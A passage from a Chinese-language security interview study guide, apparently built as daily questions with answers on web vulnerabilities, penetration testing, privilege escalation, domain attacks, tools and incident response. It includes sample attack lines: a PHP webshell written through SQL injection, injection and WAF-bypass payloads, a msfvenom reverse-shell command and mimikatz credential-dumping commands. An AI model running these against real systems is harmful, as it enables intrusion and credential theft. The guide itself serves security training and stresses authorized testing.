# 网络安全面试速答篇（每日一题 · 82 Day 版）



---

## 一、使用建议

1. **每日一题**：按顺序每天吃透 1 题，先自己口述答案，再对照本文查漏补缺。
2. **复习闭环**：当天题 = 理解答案 + 看懂解析 + 复盘知识点；周末把本周 7 题串成知识网。
3. **动手验证**：凡涉及命令/ payload 的题（如 sqlmap、nmap、提权），请在授权环境（靶场/CTF/自己机器）实操一遍，面试能讲出"我做过"。
4. **进度跟踪**：在每题前 `[ ]` 打勾

---

## 二、分类速查（Day ↔ 模块）

| 模块 | Day 范围 | 题数 |
|---|---|---|
| 一、Web 安全·常见漏洞原理与防护 | D1–D14 | 14 |
| 二、渗透测试流程与方法 | D15–D20 | 6 |
| 三、权限提升与内网渗透 | D21–D27 | 7 |
| 四、安全工具 | D28–D32 | 5 |
| 五、护网·红蓝对抗·应急响应 | D33–D38 | 6 |
| 六、网络协议与安全 | D39–D48 | 10 |
| 七、系统与中间件漏洞 | D49–D53 | 5 |
| 八、安全基础·等保·法律法规·加密 | D54–D58 | 5 |
| 九、代码审计与开发安全 | D59–D62 | 4 |
| 十、中间件与组件漏洞 | D63–D68 | 6 |
| 十一、操作系统 / 数据库 / 日志深入 | D69–D72 | 4 |
| 十二、加密深化 · 合规 · 移动 · 软技能 | D73–D82 | 10 |

---


# 模块一　Web 安全·常见漏洞原理与防护

### Day 1 ｜ SQL 注入的原理、分类与防护
- [ ] **题目**：请说明 SQL 注入的原理、常见分类，以及防御手段。

**答案**：

- **原理**：后端把用户输入直接拼接进 SQL 语句，未做校验/转义，导致用户输入被当作 SQL 代码执行，从而绕过逻辑、读取/篡改/删除数据。例：`select * from user where name='$name' and pw='$pw'`，输入 `pw = ' or '1'='1` 使条件恒真。
- **分类**：按数据类型分数字型/字符型；按回显分联合查询、报错注入、布尔盲注、时间盲注、堆叠查询；按提交方式分 GET/POST/Cookie/HTTP 头注入。
- **防护**：使用**预编译（Prepared Statement / 参数化查询）**；最小权限数据库账户；输入校验与白名单；ORM 框架；敏感操作加 WAF；错误回显关闭。

**解析**：预编译是根本解法——SQL 语义与数据分离，参数永远作为值而非代码。WAF/过滤只是辅助，不能替代参数化。面试常追问"预编译就绝对安全吗？"——若仍用拼接（如 `order by $col`）或宽字节/二阶注入场景仍可能中招。

**考察知识点**：SQL 语法、参数化查询、注入类型、纵深防御。

### Day 2 ｜ SQL 注入写文件（webshell）的条件
- [ ] **题目**：通过 MySQL 注入点直接写入一句话木马，需要哪些前提条件？

**答案**：

1. 网站**绝对路径**已知（报错/phpinfo/读取配置文件得到）；
2. 当前数据库用户具备 **File 权限**（`select file_priv from mysql.user` 为 Y）；
3. `secure_file_priv` 为空（非 `NULL` 限制目录）；
4. **写入口令**对目标目录有写权限（通常 web 目录可写）；
5. 用 `select '<?php @eval($_POST[1]);?>' into outfile '/var/www/shell.php'` 导出。

**解析**：`into outfile`/`into dumpfile` 受 `secure_file_priv` 严格限制（MySQL 5.6+ 默认 `NULL` 禁止导出）。`outfile` 会转义换行，`dumpfile` 不转义，写二进制用 dumpfile。若不能写文件，可改读文件（`load_file`）。

**考察知识点**：MySQL 文件操作权限、secure_file_priv、getshell 路径。

### Day 3 ｜ 盲注（布尔/时间）与报错注入
- [ ] **题目**：没有回显时如何注入？报错注入常用函数有哪些？

**答案**：

- **布尔盲注**：构造 `and 1=1` / `and 1=2`，根据页面真假差异逐位猜解（配合 `substr()`/`ascii()`/`length()`）。
- **时间盲注**：无差异时用 `and sleep(5)` 或 `if(...,sleep(5),0)`、`benchmark()` 看响应时延。
- **报错注入**：利用报错回显数据，如 `updatexml(1,concat(0x7e,(select version()),0x7e),1)`、`extractvalue()`、`floor(rand(0)*2)` 主键冲突、`exp()` 溢出。

**解析**：盲注效率低，实战用 `sqlmap -technique=B/T` 自动化；报错注入依赖特定函数报错且版本相关（updatexml/extractvalue 在 MySQL 5.x 通用）。`floor(rand(0)*2)` 需 `group by` 与 `count(*)` 配合。

**考察知识点**：盲注逻辑、报错函数、sqlmap 技术参数。

### Day 4 ｜ XSS 类型与防御
- [ ] **题目**：XSS 有哪几种类型？如何防御？

**答案**：

- **存储型**：恶意脚本存于数据库，用户访问时服务端返回并执行（危害最大，如留言/评论）。
- **反射型**：payload 在 URL 中，服务端原样返回到页面（需诱导点击）。
- **DOM 型**：前端 JS 直接操作 DOM（如 `location.hash`、`innerHTML`）造成，不经过服务端。
- **防御**：输出**编码/转义**（HTML 实体、JS、URL 编码按需）；输入校验白名单；`HttpOnly` + `Secure` + `SameSite` Cookie；CSP 策略；富文本用白名单过滤器（如 DOMPurify）。

**解析**：存储型危害最高（可盗 Cookie、蠕变、配合 CSRF）。DOM 型要在前端代码层面修（不要在 `.innerHTML`/`.html()` 直接拼用户输入）。CSP 是纵深防御而非万能。

**考察知识点**：XSS 三类区别、输出编码、CSP、HttpOnly。

### Day 5 ｜ CSRF 原理与防御，与 XSS 区别
- [ ] **题目**：CSRF 是什么？如何防护？它和 XSS 有何区别？

**答案**：

- **原理**：攻击者诱导已登录用户浏览器，在用户不知情下向存在漏洞的站点发起**伪造请求**（利用浏览器自动带 Cookie 的特性），以用户身份执行操作（改密码/转账）。
- **防护**：**CSRF Token**（服务端随机令牌，请求必须携带且校验）；校验 `Referer`/`Origin`；`SameSite=Strict/Lax` Cookie；重要操作加二次认证/验证码。
- **与 XSS 区别**：XSS 利用"用户对站点的信任"（盗取/执行）；CSRF 利用"站点对用户的信任"（冒用身份）。XSS 可盗 Token，CSRF 无法读响应。

**解析**：Token 必须随机、不可预测、绑定会话且一次一用；`SameSite=Lax` 已能挡多数跨站场景。RESTful 接口若用自定义头（如 `X-Requested-With`）也能增加 CSRF 难度（简单请求不跨域发自定义头）。

**考察知识点**：CSRF 利用链、Token、SameSite、与 XSS 边界。

### Day 6 ｜ SSRF 原理、利用与防御
- [ ] **题目**：SSRF 是什么？常见利用与防御？

**答案**：

- **原理**：服务端代用户发起请求，且 URL 由用户可控，攻击者可让服务器访问**内网/本地**资源（如 `http://127.0.0.1:6379`、`file:///etc/passwd`、`http://169.254.169.254/` 云元数据）。
- **利用**：探测内网端口、攻击内网服务（Redis/MySQL）、读取本地文件、绕过授权访问云元数据（AK 泄露）、配合 Gopher 打内网协议。
- **防御**：**白名单**协议（仅 http/https）与域名/IP；禁止访问内网与回环地址（正则过滤 `127.0.0.1`、`localhost`、`0.0.0.0`、十进制/八进制 IP 绕过需一并处理）；统一出网出口；需鉴权的内网服务加认证。

**解析**：绕过手段多（DNS 重绑定、`xip.io`、进制转换、短网址），单纯黑名单不够，应做"解析后校验目标 IP 是否在内网"。这是云原生环境下的高危漏洞。

**考察知识点**：SSRF 危害面、云元数据、DNS 重绑定、白名单校验。

### Day 7 ｜ 命令执行 / 代码执行函数及防御
- [ ] **题目**：PHP/Java 中常见的命令执行、代码执行函数有哪些？如何防御？

**答案**：

- **PHP**：命令执行 `system() exec() shell_exec() passthru() popen()`、`\`反引号\``；代码执行 `eval() assert() preg_replace(/e) create_function()`。
- **Java**：`Runtime.exec()`、`ProcessBuilder`、`Groovy/SpEL/Ognl` 表达式、`ScriptEngine`。
- **防御**：禁用危险函数（`disable_functions`）；绝不拼接用户输入进命令/表达式；用白名单参数；白名单校验文件/命令；RASP 运行时防护。

**解析**：`Runtime.exec()` 不支持 shell 重定向/管道，需经 `/bin/sh -c`。Java 表达式注入（SpEL/Ognl）常见于 Spring/Struts 历史洞。

**考察知识点**：危险函数清单、命令注入与代码注入差异、disable_functions。

### Day 8 ｜ 文件上传漏洞与绕过
- [ ] **题目**：文件上传漏洞有哪些绕过方式？如何根本防御？
**答案**：
- **绕过**：前端 JS 校验（Burp 改包）；服务端后缀黑名单不全（`.php5 .phtml .pht`、`.asa .cer`、大小写、`.php.`、空格点、`::$DATA`、双后缀 `.php.jpg`）；Content-Type 伪造；`.htaccess`/`user.ini` 解析；00 截断（旧版）；二次渲染绕过（维持图片马结构）；竞争条件（先传后删）。
- **防护**：**白名单**后缀（仅允许业务需要的类型）；重命名随机文件名（用户不可控扩展名）；存于非执行目录；限制 Content-Type 并二次渲染；单独域名/隔离存储（如 OSS）。
**解析**：黑名单永远有遗漏，白名单 + 随机重命名 + 非执行存储位是黄金组合。`.htaccess` 写入需目录允许覆盖配置。
**考察知识点**：黑白名单、解析漏洞、00 截断、二次渲染、随机命名。

### Day 9 ｜ 常见 Web 容器解析漏洞
- [ ] **题目**：IIS / Apache / Nginx 有哪些经典解析漏洞？
**答案**：
- **IIS 6.0**：`*.asp;*.jpg` 按 asp 解析；目录 `/*.asp/` 下文件当 asp。
- **Apache**：多后缀从右往左认，遇不认识的后缀继续向左（`a.php.xxx` 若 `.xxx` 未知可能按 `.php` 解析）；`AddHandler` 配置 `*.php` 导致 `x.php.jpg` 解析。
- **Nginx**：`xxx.jpg/1.php` 若 `cgi.fix_pathinfo=1` 且 PHP 配置不当会解析；空字节 `%00.php` 旧版；`x.jpg%00.php` 截断。
**解析**：本质都是"解析器对路径/后缀的处理规则"与预期不符。修复靠升级版本与收紧配置（关闭 `cgi.fix_pathinfo`、正确设置 `security.limit_extensions`）。
**考察知识点**：IIS/Apache/Nginx 解析差异、fix_pathinfo、后缀处理顺序。

### Day 10 ｜ XXE 原理与防御
- [ ] **题目**：什么是 XXE？如何产生与防御？
**答案**：
- **原理**：XML 解析器启用外部实体（DTD）时，攻击者构造 `<!ENTITY xxe SYSTEM "file:///etc/passwd">` 读取本地文件，或用 `http://` 造成 SSRF、拒绝服务（Billion Laughs 实体膨胀）。
- **防御**：**禁用外部实体**（`libxml_disable_entity_loader(true)` / `XMLConstants.FEATURE_SECURE_PROCESSING` / 关闭 `DOCTYPE`）；使用 JSON 替代 XML；升级解析库。
**解析**：XXE 常出现在支持 XML 的接口（SVG 上传、Office 文档、SOAP、SSO SAML）。本质是"解析器信任了外部实体声明"。
**考察知识点**：外部实体、DTD、实体膨胀、禁用实体加载。

### Day 11 ｜ 反序列化漏洞原理（PHP / Java）
- [ ] **题目**：反序列化漏洞是什么？PHP 与 Java 有何不同？
**答案**：
- **原理**：把用户可控的序列化数据反序列化时，对象重建过程触发**魔术方法/生命周期回调**（PHP 的 `__destruct()` `__wakeup()`，Java 的 `readObject()`），若其中调用危险方法且参数可控即 RCE。
- **PHP**：`unserialize($_GET['data'])`，依赖 POP 链（如 `__destruct → call → system`）。
- **Java**：依赖存在 gadget 的库（CommonsCollections、CommonsBeanutils、FastJson、Jackson），构造利用链触发 `Runtime.exec`/`Method.invoke`。
- **防御**：不反序列化不可信数据；使用白名单类名（`ObjectInputFilter`）；升级含已知 gadget 的库；签名校验数据完整性。
**解析**：Java 反序列化不等于"任意反序列化就 RCE"，关键是有**可利用的 gadget 链**。Shiro（硬编码 key + CB 链）、FastJson（`@type` 自动类型）是经典入口。
**考察知识点**：序列化/反序列化、魔术方法、POP/gadget 链、Shiro/FastJson。

### Day 12 ｜ 逻辑漏洞：越权 / 支付 / 验证码 / 密码找回
- [ ] **题目**：常见的业务逻辑漏洞有哪些？如何修复？
**答案**：
- **越权**：水平（改 `user_id` 看他人数据）、垂直（普通用户访问管理员接口）。修复：服务端**严格校验当前用户对该资源的权限**，不依赖前端隐藏。
- **支付/数量**：修改金额、数量、为负、并发重复下单。修复：服务端重算价格、库存加锁、幂等校验。
- **验证码**：前端校验、可重用、可爆破、不过期。修复：服务端校验、单次有效、限频、图形复杂度。
- **密码找回**：改 `userid` 改他人邮箱、验证码回显、token 可预测。修复：绑定身份、token 随机且短时、校验一致性。
**解析**：逻辑漏洞源于"只信前端/只信参数"。面试强调"所有权限与金额判断必须在服务端做，且基于当前会话身份"。
**考察知识点**：水平/垂直越权、服务端鉴权、幂等、验证码安全。

### Day 13 ｜ 未授权访问与任意文件读取/下载
- [ ] **题目**：未授权访问和任意文件读取有哪些典型场景？
**答案**：
- **未授权访问**：Redis/MongoDB/Elasticsearch/Kibana/Solr 暴露在公网无认证；后台/API 仅靠 URL 隐藏；Actuator、Swagger 未鉴权泄露。
- **任意文件读取/下载**：`download?file=../../etc/passwd`（路径遍历）；日志/模板读取；配合 `file://` 读源码、配钥。
- **修复**：服务加认证与网络隔离；文件路径用 ID 映射（禁用户输入路径）；白名单目录；最小权限运行；关闭不必要的管理端。
**解析**：路径遍历用 `../`、编码 `..%2f`、`....//` 绕过。未授权 Redis 常可直接写 webshell 或 SSH 公钥。
**考察知识点**：路径遍历、目录穿越、服务未授权、ID 映射。

### Day 14 ｜ WAF bypass 思路
- [ ] **题目**：如何绕过 WAF 进行注入/上传/XSS？
**答案**：
- **注入**：混淆（注释 `/**/`、`/*!*/`、内联注释）、换行/编码（URL/Unicode/十六进制）、等价函数替换（`sleep`→`benchmark`、`substring`→`substr`）、分块传输（Chunked）、HTTP 参数污染（HPPT）、双写 `ununionion`、畸形包。
- **上传**：见 Day 8 后缀/Content-Type/解析绕过。
- **XSS**：标签/事件拼接（`<img src=x onerror=>`）、编码绕过、大小写/换行、利用 SVG/MathML。
- **根本**：WAF 是边界，真正安全靠代码层修复；bypass 仅用于测试与证明危害。
**解析**：现代云 WAF 还有分块、TLS 分片、超大数据包等绕过。强调"绕过是为了验证防护有效性，不是教攻击"。
**考察知识点**：SQL/XSS 混淆、分块传输、参数污染、防御为本。

---

# 模块二　渗透测试流程与方法

### Day 15 ｜ 渗透测试标准流程（PTES）
- [ ] **题目**：一次完整的渗透测试流程是什么？
**答案**：
1. **前期交互**：明确目标、范围、授权边界、时间与方式（黑/白/灰盒）、交付物。
2. **情报收集（信息收集）**：被动+主动，域名/IP/资产/端口/服务/指纹/人员。
3. **威胁建模**：确定攻击面与优先级。
4. **漏洞分析**：扫描+手工验证。
5. **漏洞利用**：getshell、提权、内网横向。
6. **后渗透**：权限维持、内网拓展、敏感数据。
7. **报告**：漏洞清单、复现、危害、修复建议。
8. **复测**：验证修复有效性。
**解析**：PTES 是业界通用框架。强调"授权先行"——无书面授权的测试违法。护网/众测都需范围确认。
**考察知识点**：PTES 阶段、授权、情报收集、后渗透、报告。

### Day 16 ｜ 信息收集都收集什么
- [ ] **题目**：渗透测试的信息收集阶段要收集哪些内容？
**答案**：
- **资产**：域名、子域、C 段、旁站、IP、CDN 前后的真实 IP、ASN。
- **服务**：开放端口、服务/版本、Web 指纹（CMS、中间件、框架）、WAF 类型。
- **人员**：whois、备案、邮箱、GitHub 泄露、社工库关联。
- **技术**：目录/敏感文件（备份、.git、phpinfo）、JS 接口、API、配置泄露。
- **工具**：OneForAll、subfinder、masscan、nmap、fofa/quake/hunter 等引擎。
**解析**：信息收集决定攻击面宽度。旁站/C 段、真实 IP（绕 CDN）、GitHub 源码泄露常是突破口。
**考察知识点**：资产测绘、真实 IP、指纹识别、OSINT。

### Day 17 ｜ 黑盒 / 白盒 / 灰盒区别
- [ ] **题目**：黑盒、白盒、灰盒测试的区别？
**答案**：
- **黑盒**：无内部信息，仅从外部模拟攻击者（最接近真实入侵）。
- **白盒**：提供源码/架构/账号，做代码审计与配置审查（覆盖深）。
- **灰盒**：部分信息（如普通账号），兼顾效率与真实度。
**解析**：渗透测试实习常从黑盒起步，进阶需白盒代码审计能力。面试会问"你更擅长哪种"——如实说并说明学习路径。
**考察知识点**：测试模型、代码审计、真实性 vs 覆盖度。

### Day 18 ｜ 拿到 webshell 后的思路
- [ ] **题目**：拿到一个 webshell 后，下一步怎么扩大战果？
**答案**：
1. **判环境**：系统（Linux/Win）、权限（whoami）、网络位置（是否内网）。
2. **提权**：内核/服务/配置不当（见模块三）。
3. **信息搜集**：配置文件（数据库/云 AK）、内网段、域信息。
4. **内网横向**：端口扫描、口令复用、PTH、搭建代理（reGeorg/frp）。
5. **权限维持**：计划任务、启停项、后门账号、webshell 变形。
6. **清理**：清日志、测试数据，输出报告。
**解析**：低权限 shell 价值有限，提权与内网才是关键。所有动作须在授权范围并记录，便于出报告与复测。
**考察知识点**：后渗透、提权、内网横向、权限维持。

### Day 19 ｜ 获取 webshell 的多种途径
- [ ] **题目**：拿到一个网站 webshell 有哪些常见途径？
**答案**：
- 文件上传（解析/绕过，见 Day 8/9）；
- 后台模板/配置文件编辑写入；
- SQL 注入写文件（Day 2）；
- 命令执行/代码执行点；
- 反序列化/表达式注入（Day 11）；
- 已知 CMS/中间件 RCE（Struts2、Log4j、Weblogic）；
- 第三方组件/插件漏洞。
**解析**：面试常问"优选哪种"——优先找**最稳定、最难被发现**的（如后台模板/配置写入），避免频繁上传大马触发告警。
**考察知识点**：getshell 面、稳定性与隐蔽性权衡。

### Day 20 ｜ 授权边界与合规
- [ ] **题目**：渗透测试的合法边界是什么？
**答案**：
- 必须有**书面授权**（授权书/合同），明确目标、IP、时间、方式、禁止行为（如破坏、拖库、影响业务）。
- 遵守《网络安全法》《数据安全法》《刑法》285/286 条；未经授权扫描/测试可能违法。
- 护网/众测在指定范围与时段内进行；发现高危（如可 RCE、可拖库）及时上报，不扩大危害。
**解析**：这是安全从业底线。面试必问"你做过未授权测试吗"——必须答"只在授权范围内"。CISP-PTE 也强调合规。
**考察知识点**：授权测试、网络安全法、护网合规、红队纪律。

---

# 模块三　权限提升与内网渗透

### Day 21 ｜ Windows 常见提权方法
- [ ] **题目**：Windows 下常见的提权方式有哪些？
**答案**：
- **系统漏洞**：内核提权（如 MS16-032、CVE 提权），用 `systeminfo` 对照补丁。
- **服务/计划任务**：服务路径可写（烂土豆系列 RottenPotato→JuicyPotato）、计划任务以 SYSTEM 运行且脚本可写。
- **错误权限配置**：可写目录、AlwaysInstallElevated（msi 提权）、未引号服务路径。
- **令牌窃取**：`Incognito`/`Potato` 系列盗用令牌。
- **工具**：WinPEAS、PowerUp、Sherlock、MSF `local_exploit_suggester`。
**解析**：先 `whoami /priv` 看是否有 `SeImpersonatePrivilege`（土豆类提权前提）。优先用 PEAS 类脚本全盘检查"错误配置"比盲打/exp 更稳。
**考察知识点**：内核提权、令牌 impersonate、错误配置、WinPEAS。

### Day 22 ｜ Linux 常见提权方法
- [ ] **题目**：Linux 下常见的提权方式有哪些？
**答案**：
- **内核漏洞**：脏牛（CVE-2016-5195）、脏管道（CVE-2022-0847）等，比对内核版本。
- **SUID 滥用**：`find / -perm -u=s` 找异常 SUID（如 `find`、`vim`、`nmap` 交互模式）。
- **sudo 配置不当**：`sudo -l` 看可无密码执行的命令（如 `sudo vim`→`:!sh`）。
- **计划任务/可写脚本**：cron 以 root 执行且文件可写。
- **环境变量劫持**：`PATH` 劫持、sudo 的 `env_keep`。
- **工具**：LinPEAS、linprivchecker、GTFOBins。
**解析**：`sudo -l` 与 SUID 是最常见的"低垂果实"。GTFOBins 是查单条命令提权的权威库。
**考察知识点**：SUID、sudo 滥用、cron、GTFOBins、LinPEAS。

### Day 23 ｜ 内网渗透思路

- [ ] **题目**：拿到边界机后，内网渗透的一般思路？

**答案**：

1. 本机信息：网卡、路由、域、登录会话、本地哈希（`mimikatz`/`sekurlsa`）。
2. 内网存活与拓扑：扫描网段（arp/nbtscan/icmp）、端口服务。
3. 横向移动：IPC$/WMI/psexec、SMB/WinRM、口令复用/爆破、PTH。
4. 域渗透：定位域控、Kerberos 攻击（见 D24–D26）。
5. 权限维持与凭据窃取：黄金票据、组策略、DCSync。
6. 目标达成（域控/核心数据）后出报告。

**解析**：内网核心是"凭据复用 + 信任关系利用"。先找域成员/域控，再围绕 Kerberos 做文章。

**考察知识点**：内网拓扑、横向移动、凭据复用、域控定位。

### Day 24 ｜ 域渗透：Kerberos 认证过程
- [ ] **题目**：简述域环境中 Kerberos 认证流程。
**答案**：
- **AS-REQ/AS-REP**：客户向 AS 请求 TGT，AS 用 krbtgt 密钥加密返回 TGT（含会话密钥）。
- **TGS-REQ/TGS-REP**：客户用 TGT 向 TGS 请求某服务票据（ST），TGS 用服务账号密钥加密 ST。
- **AP-REQ/AP-REP**：客户携 ST 访问服务，服务用自身密钥解密校验。
**解析**：理解三步走是关键。黄金票据伪造 TGT（需 krbtgt 哈希），白银票据伪造 ST（需服务账号哈希），分别对应不同环节。
**考察知识点**：AS/TGS、TGT/ST、krbtgt、票据流转。

### Day 25 ｜ 黄金票据 / 白银票据
- [ ] **题目**：黄金票据和白银票据分别伪造什么？条件与区别？
**答案**：
- **黄金票据（Golden Ticket）**：伪造 **TGT**，需 `krbtgt` 账号的 NTLM 哈希 + 域名/SID/管理员名。效果：任意服务任意权限、长期有效、无需与 DC 通信。
- **白银票据（Silver Ticket）**：伪造 **ST**，需目标**服务账号**哈希（如机器账号/SQL）。效果：仅对该服务有效、不留域控日志，但需知道服务名。
**解析**：黄金票据权限更大、隐蔽性更强（不接触 DC），白银票据日志更少但范围小。两者都依赖"哈希泄露"，防护在凭据保护与 DC 加固。
**考察知识点**：TGT vs ST 伪造、krbtgt、日志差异、凭据保护。

### Day 26 ｜ PTH / PTT、mimikatz
- [ ] **题目**：什么是 PTH、PTT？mimikatz 的作用？
**答案**：
- **PTH（Pass The Hash）**：直接用 NTLM 哈希认证，无需明文口令（如 `sekurlsa::pth`）。
- **PTT（Pass The Ticket）**：传递票据（如注入黄金/白银票据、kirbi）。
- **mimikatz**：提取明文/哈希（`sekurlsa::logonpasswords`）、票据（`sekurlsa::tickets`）、DCSync（`lsadump::dcsync`）、生成黄金票据（`kerberos::golden`）。
**解析**：PTH 在 NTLM 环境有效；PTT 绕过 NTLM 限制。mimikatz 是域渗透标配工具，蓝队需在日志/EDR 层面检测其典型行为（如 lsass 读取）。
**考察知识点**：哈希传递、票据传递、lsass、DCSync。

### Day 27 ｜ 内网穿透
- [ ] **题目**：什么是内网穿透？常见工具与场景？
**答案**：
- **目的**：把内网/靶机端口映射到公网或可访问点，便于用本机工具（MSF、C2）控制。
- **工具/方式**：frp、ngrok、reGeorg（HTTP 隧道）、EarthWorm（ew）、SSH 反向隧道、CS 的 listener/beacon。
- **场景**：目标只出网、无公网 IP；通过 webshell 建隧；护网中 C2 隐蔽通道。
**解析**：穿透要解决"目标不暴露公网"的问题。reGeorg 走 HTTP 最不易被拦；frp 需一台公网跳板。注意流量加密与画像规避。
**考察知识点**：frp/reGeorg、反向隧道、C2、流量隐蔽。

---

# 模块四　安全工具

### Day 28 ｜ Burp Suite 核心功能
- [ ] **题目**：Burp Suite 主要有哪几块功能？实战怎么用？
**答案**：
- **Proxy**：拦截/改包（重发、绕过前端校验）。
- **Repeater**：手动重放、调 payload。
- **Intruder**：爆破/模糊测试（Sniper/Cluster bomb 等攻击类型）。
- **Decoder/Comparer**：编解码、差异比对。
- **Scanner（Pro）/Extensions**：主动扫描、插件（如 SQLiPy、Authz、HaE）。
**解析**：Proxy+Repeater+Intruder 是日常三件套；Authz 做越权测试、HaE 做被动信息收集。配合浏览器代理与证书安装。
**考察知识点**：Proxy/Repeater/Intruder、攻击类型、插件生态。

### Day 29 ｜ sqlmap 对注入点注入
- [ ] **题目**：用 sqlmap 怎么对一个注入点注入？常用参数？
**答案**：
- 基本：`sqlmap -u "url?p=1" --batch`
- 指定注入点/技术：`--data` POST、`-p id` 指定参数、`--technique=BEUST`（B布尔/E报错/U联合/S堆叠/T时间）。
- 拖库：`--dbs / --tables / --dump`、`--current-db`、`--os-shell`（写 shell 需文件权限）。
- 进阶：`--tamper=xxx`（绕过 WAF）、`--level=5 --risk=3`、`--threads`。
**解析**：先用 `--batch` 自动确认；有 WAF 加 `--tamper`（如 `space2comment`、`charencode`）。`--os-shell` 依赖 Day 2 的文件写条件。
**考察知识点**：sqlmap 参数、technique、tamper、os-shell。

### Day 30 ｜ nmap 常用用法
- [ ] **题目**：nmap 常用的扫描命令与脚本？
**答案**：
- 端口：`nmap -p- -sT` 全端口 TCP；`-sS` SYN 半开（需权限）；`-sU` UDP。
- 服务/系统：`nmap -sV -O`；`-Pn` 跳过存活探测（禁 ping 环境）。
- 脚本：`nmap --script=default/vuln/smb-*`；`-A` 综合。
- 输出：`-oN/-oX` 保存。
**解析**：`-sS` 快但需原始套接字权限（Windows 上常退回 `-sT`）；内网用 `-Pn` 避免被防火墙丢 icmp 漏主机。`vuln` 脚本可初筛已知漏洞。
**考察知识点**：SYN 扫描、服务识别、NSE 脚本、-Pn。

### Day 31 ｜ Metasploit (MSF) 使用
- [ ] **题目**：Metasploit 的基本使用流程？
**答案**：
- `msfconsole` 进入；`search` 找模块；`use` 加载 exploit/auxiliary；`set RHOSTS/LPORT/PAYLOAD`；`exploit`/`run`。
- 后渗透：`post/` 模块、`sessions` 管理、`migrate` 进程迁移、`getsystem` 提权、`hashdump`、`run persistence` 维持。
- 生成 payload：`msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o x.exe`。
**解析**：MSF 是后渗透中枢，配合数据库（`db_nmap`）管理多目标。Meterpreter 强在内存执行与丰富后渗透命令。
**考察知识点**：模块体系、payload、meterpreter、后渗透命令。

### Day 32 ｜ 冰蝎 / 蚁剑 / 菜刀区别与流量特征
- [ ] **题目**：菜刀、蚁剑、冰蝎有什么异同？流量特征？
**答案**：
- **菜刀（Cknife）**：老牌，明文/简单加密通信，特征明显易被检测。
- **蚁剑（AntSword）**：开源、多平台、插件化，默认流量仍有特征。
- **冰蝎（Behinder）**：**流量加密**（AES，密钥协商），无明显明文特征，较难检测；需服务端特定 eval 解析。
- **防守侧**：WAF/IDS 靠正则与行为识别；冰蝎靠解密与异常长连接/非常规 UA 检测；建议用哥斯拉等更新马并自定义流量。
**解析**：免杀与流量加密是红队重点，也是蓝队检测难点。面试常从"防守如何发现"反向考察。
**考察知识点**：三款马差异、加密流量、检测思路、哥斯拉。

---

# 模块五　护网·红蓝对抗·应急响应

### Day 33 ｜ 护网行动与红蓝队职责
- [ ] **题目**：什么是护网行动？红队、蓝队分别做什么？
**答案**：
- **护网**：国家/行业组织的网络安全实战攻防演练，红队攻击、蓝队防守，检验防护与应急能力。
- **红队**：模拟真实攻击方，信息收集→外网突破→钓鱼/边界突破→内网横向→拿分（靶标系统）。强调隐蔽与合规。
- **蓝队**：监测（流量/日志/终端）、研判告警、处置（封 IP/隔离主机）、溯源反制、编写报告。
**解析**：护网是"以攻促防"。红队得分靠拿下指定靶标（如域控/业务系统），蓝队靠早发现、快处置、成功溯源反制。
**考察知识点**：护网机制、红蓝分工、靶标、攻防对抗。

### Day 34 ｜ 红队攻击思路
- [ ] **题目**：红队一般怎么打？
**答案**：
1. 外网资产测绘（fofa/quake + 自研），找暴露面与 0day/NDay。
2. Web 突破：注入/上传/反序列化/RCE 拿边界 webshell。
3. 钓鱼：伪装邮件/客服，诱导运行木马（C2 上线）。
4. 边界到内网：提权、内网横向、域渗透拿域控/靶标。
5. 隐蔽：流量加密、免杀、清除痕迹、躲避蜜罐/蜜饵。
**解析**：红队不只技术，还重社工与供应链。近年强调"不触碰非靶标、不扩大影响"，纪律第一。
**考察知识点**：外网突破、钓鱼、横向、隐蔽、合规纪律。

### Day 35 ｜ 蓝队监测防守思路
- [ ] **题目**：蓝队如何监测与防守？
**答案**：
- **监测**：全流量探针、IDS/IPS、EDR、日志集中（SIEM）、威胁情报比对。
- **研判**：区分误报与真实攻击（看 payload、源 IP、行为链）。
- **处置**：封禁 IP、隔离主机、断网、改密、关端口、WAF 加规则。
- **反制**：溯源攻击链、蜜罐诱捕、反制钓鱼样本回连。
**解析**：蓝队靠"看见"能力（全流量+终端）。重点是从海量告警中快速定位高危真实事件并形成处置闭环。
**考察知识点**：SIEM、EDR、流量分析、处置闭环、溯源。

### Day 36 ｜ 应急响应流程（入侵排查）
- [ ] **题目**：发生入侵/勒索时，应急响应流程是什么？
**答案**：
1. **隔离**：断网/封端口，防止扩散（保留现场）。
2. **研判**：确认事件类型（webshell/勒索/挖矿/反弹 shell）、时间线。
3. **排查**：进程（`ps`/`tasklist`）、网络连接（`netstat`）、启动项、计划任务、账号、近期文件、日志（web/安全/系统）。
4. **清除**：删马、杀进程、修漏洞、改密、补丁。
5. **恢复**：从干净备份恢复，业务验证。
6. **复盘**：根因、加固、报告与改进。
**解析**：原则是"先隔离后取证"，避免破坏证据。勒索优先断网+停共享，切忌盲目重启（可能触发锁盘）。
**考察知识点**：应急响应 PDCERF、隔离取证、排查项、根因。

### Day 37 ｜ webshell 查杀 / 内存马检测
- [ ] **题目**：如何查杀 webshell 与内存马？
**答案**：
- **webshell**：文件特征（关键词 `eval`/`assert`/`base64_decode`、一句话）、MD5 比对、河马/ D 盾等查杀器、对比基线。
- **内存马**：Java 中 Filter/Servlet/Listener 型无文件马，靠 arthas 看加载类、检查中间件上下文、dump 内存分析；重启可清除但需根除入口。
**解析**：内存马无落地文件，传统文件查杀失效，需结合进程/类加载分析。防守要定位"为什么能注入"（反序列化/表达式注入入口）并修复。
**考察知识点**：文件马 vs 内存马、arthas、无文件攻击、查杀器。

### Day 38 ｜ 溯源反制思路
- [ ] **题目**：蓝队如何做攻击溯源与反制？
**答案**：
- **溯源**：从告警反向还原攻击链（IP→payload→样本→C2），用威胁情报扩线、关联同手法其他告警、定位攻击者画像（虚拟身份/跳板）。
- **反制**：蜜罐部署诱捕、在可控样本/页面埋反制代码（如获取攻击者真实 IP/主机信息，须合法合规）、钓鱼反制。
**解析**：溯源讲"证据链闭合"，反制必须在法律与授权框架内，避免变成"以攻对攻"违法。
**考察知识点**：攻击链还原、威胁情报、蜜罐反制、合规边界。

---

# 模块六　网络协议与安全

### Day 39 ｜ TCP 与 UDP 区别
- [ ] **题目**：TCP 和 UDP 的区别？
**答案**：
- **TCP**：面向连接、可靠（确认/重传/拥塞控制）、字节流、一对一、有握手，速度慢，用于 HTTP/SSH/MySQL 等。
- **UDP**：无连接、不可靠（不保证到达/有序）、数据报、支持一对多、实时性高，用于 DNS/视频/游戏/QUIC。
